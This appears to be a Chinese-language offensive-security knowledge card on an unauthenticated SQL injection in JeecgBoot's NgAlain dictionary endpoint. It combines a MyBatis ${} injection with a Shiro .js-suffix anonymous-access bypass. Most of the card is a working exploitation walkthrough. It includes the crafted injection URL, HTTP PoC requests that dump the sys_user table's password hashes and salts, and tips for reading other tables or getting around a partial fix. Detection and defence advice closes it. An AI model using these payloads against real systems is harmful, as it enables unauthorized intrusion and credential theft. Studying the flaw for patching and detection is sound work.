---
id: web-java-framework-jeecgboot-ngalain-getdictitemsbytable-pathvariable-sqli
title: JeecgBoot NgAlain getDictItemsByTable 路径变量 ${table}/${key}/${value} 注入：配合 Shiro /**/*.js 匿名后缀未授权读取 sys_user
type: scenario
domain: web
path: web/java/framework
technique: jeecgboot-ngalain-dict-table-pathvariable-sqli
aliases:
- JeecgBoot NgAlain SQL注入
- getDictItemsByTable 注入
- ng-alain 字典接口 SQLi
- ${table} ${key} ${value} 注入
- JeecgBoot 未授权 SQL 注入
- .js 后缀未授权注入
tags:
- java
- jeecgboot
- mybatis
- sqli
- pathvariable
- shiro
- auth-bypass
- spring-boot
- component
cve: []
severity: high
confidence: high
affected_versions: Jeecg-boot v2.1.2 - v3.0.0（原文标题标注）
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V621
  verified_at: '2026-11-12T21:51:12+08:00'
  notes: 已对照原文全文与6张图核对：图01 NgAlainController 的 /sys/ng-alain/getDictItemsByTable/{table}/{key}/{value} 与 getDictByTable 调用、图02 mapper @Select(select ${key} as "label",${value} as "value" from ${table})、图04/05 filterChainDefinitionMap 中 /**/*.js 等后缀 anon 且在 /** 之前、图06 构造 URL 的 X-Access-Token 为空值且返回3400字节 sys_user 全列(password/salt/email等)均一致；图03 首次验证请求带 JWT，属先验证接口可达。affected_versions 仅原文标题标注 v2.1.2-v3.0.0，正文无修复版本/CVE，卡内已如实标注，未改版本。dedup：与既有 getDictItems/{dictCode} filterSql 注入卡并非同端点/同注入构造，与 Shiro 通用后缀绕过卡为组合关系，保留。
---

## 一句话结论

JeecgBoot 的 `/sys/ng-alain/getDictItemsByTable/{table}/{key}/{value}` 把三个路径变量原样传给 MyBatis `@Select("select ${key} as \"label\",${value} as \"value\" from ${table}")`，select 列表与 from 表名都可被注入；再借用 Shiro `/**/*.js` 全局匿名规则——把最后一个路径变量写成 `x.js` 既充当注入列名又让整个 URL 以 `.js` 结尾——即可在未认证情况下执行任意查询，直接读出 `sys_user` 全表（含密码哈希与 salt）。

## 原理

- **注入点**：`NgAlainController` 上 `@RequestMapping("/sys/ng-alain")`，方法 `@RequestMapping(value = "/getDictItemsByTable/{table}/{key}/{value}", method = GET)` 直接 `return ngalainService.getDictByTable(table, key, value)`；对应 mapper 为 `@Select("select ${key} as \"label\",${value} as \"value\" from ${table}")`。`${}` 是 MyBatis 的字符串替换（非 `#{}` 预编译），三个变量都没有白名单或转义。
- **注入构造**：把三个路径变量切成 `table = ' from sys_user`、`key = *, '`、`value = x.js`，替换后 SQL 变为：
  ```sql
  select *, ' as "label",x.js as "value" from ' from sys_user
  ```
  单引号把中间部分变成字符串常量，`from sys_user` 成为真正的表名，于是返回 `sys_user` 的所有列；响应 JSON 里可直接看到 `password`、`salt` 等字段。
- **未授权从哪来**：JeecgBoot 用 Shiro + JWT，`filterChainDefinitionMap` 中把 `/**/*.js`、`/**/*.css`、`/**/*.png` 等静态资源后缀配成 `anon`。Shiro（AntPathMatcher）看到 URL 以 `/x.js` 结尾，判定为静态资源直接放行；Spring MVC 则按 `@PathVariable` 把 `x.js` 当作 `value` 参数路由到控制器。鉴权层与路由层对同一 URL 的语义不一致，JWT 过滤器根本没有执行。
- **为什么用 `x.js` 而不是随便一个值**：它同时满足两个约束——作为 `value` 拼进 select 列表形成合法列名/表达式，以及作为 URL 结尾命中 `.js` 匿名规则。这是该链把“绕过”和“注入”合并在一个路径变量里的关键。
- **为什么能读全表**：注入位置在 `from ${table}` 与 select 列表，攻击者可以指定任意现有表（`sys_user`）并选择列；数据库账号权限决定可读范围，默认配置下用户表可读。

## 触发条件

- JeecgBoot 版本存在 NgAlain 字典接口（原文标题标注 v2.1.2 - v3.0.0）。
- Shiro 配置中存在 `/**/*.js` 一类全局后缀 `anon` 规则（JeecgBoot 默认配置通常包含）。
- 目标可通过 HTTP 访问 `/jeecg-boot/sys/ng-alain/...`（或对应上下文路径）。
- 目标数据库账号对 `sys_user` 等表有读权限。
- 攻击者能发送带引号/逗号/斜杠的 URL 并正确编码。

## 利用步骤

1. 确认目标为 JeecgBoot：访问 `/jeecg-boot/`、登录页、`X-Access-Token`/`tenant-id` 头、Shiro `rememberMe=deleteMe` 等特征。
2. 直接访问 `/jeecg-boot/sys/ng-alain/getDictItemsByTable/sys_user/username/password`，若能返回用户名/口令列，说明接口可达；若返回 401，则构造 `.js` 后缀绕过（下一步）。
3. 构造注入路径，使末尾路径变量为 `x.js`：
   ```text
   /jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js
   ```
   解码后三个变量为 `table="' from sys_user"`、`key="*, '"`、`value="x.js"`，替换后 SQL 为 `select *, ' as "label",x.js as "value" from ' from sys_user`。
4. 发送 GET 请求（无需 `X-Access-Token`），响应 200 且 JSON 中出现 `sys_user` 的 `username`、`password`、`salt` 等字段即为成功。
5. 按需替换 `sys_user` 为其他表名、调整 select 列读取更多数据；若需要条件过滤，可在注入串中继续拼接 `where`/`union`（注意 URL 编码与 Shiro 规则匹配）。
6. 记录请求与响应作为证据，不进行破坏性写操作。

## PoC

```http
GET /jeecg-boot/sys/ng-alain/getDictItemsByTable/sys_user/username/password HTTP/1.1
Host: target:8081
Accept: application/json, text/plain, */*
```

```http
GET /jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js HTTP/1.1
Host: target:8081
Accept: application/json, text/plain, */*
```

```text
# 注入后等价 SQL
select *, ' as "label",x.js as "value" from ' from sys_user
# 响应（节选）：username/password/salt 等 sys_user 字段被原样返回
```

## 变体与关联

- 未授权后缀绕过本身是独立技术：Shiro `/**/*.js` 匿名规则与 Spring `@PathVariable` 语义差异，见 [[web-java-framework-shiro-static-suffix-anon-pathvariable-bypass]]；本卡是该技术在一个具体 `${}` 注入端点上的组合利用。
- 同产品其他字典接口注入：`/sys/dict/getDictItems/{dictCode}` 的 `filterSql` 注入（`WHERE ${filterSql}`，四段式 dictCode、黑名单绕过）见 [[web-java-framework-jeecgboot-dict-filter-sql-injection]]、[[web-java-framework-jeecgboot-dict-blacklist-bypass-sqli]]；本卡注入的是 `select` 列表与 `from` 表名，端点/mapper/参数结构均不同。
- 若目标已修复 `.js` 匿名规则，可尝试其他被放行的静态后缀（`.css`/`.png` 等）或让下游用注释消化后缀；若控制器本身有二次鉴权则此链失效。
- 修复方向是 `${}` 改 `#{}` 并对表名/列名做白名单；仅删 `.js` 规则不能消除注入，仅参数化也不能阻止已进入控制器的注入，需要两者同时修。

## 检测与防御

- 防御：MyBatis 一律用 `#{}` 预编译；表名/列名无法参数化时改为固定枚举白名单映射，禁止把路径变量直接拼入 SQL。
- 防御：Shiro 匿名规则改为精确静态资源路径（如 `/static/**`、明确的文件名），不要使用 `/**/*.js` 这类全局后缀通配；对 `@PathVariable` 接口在 Controller 层再次做权限校验。
- 防御：升级 JeecgBoot 到修复版本（按官方公告），并限制数据库账号对 `sys_user` 等敏感表的访问。
- 检测：审计 URL 中以 `.js/.css/.png` 结尾但实际路由到业务 Controller 的请求（尤其是路径中含引号、逗号、空格、注释符的）；WAF 对 `getDictItemsByTable` 路径变量中的 SQL 关键字与特殊字符告警。
- 检测：数据库侧监控异常 `select * from sys_user` 查询、单请求返回大量用户字段的行为；应用日志关注 `NgAlainController` 的高频异常调用。
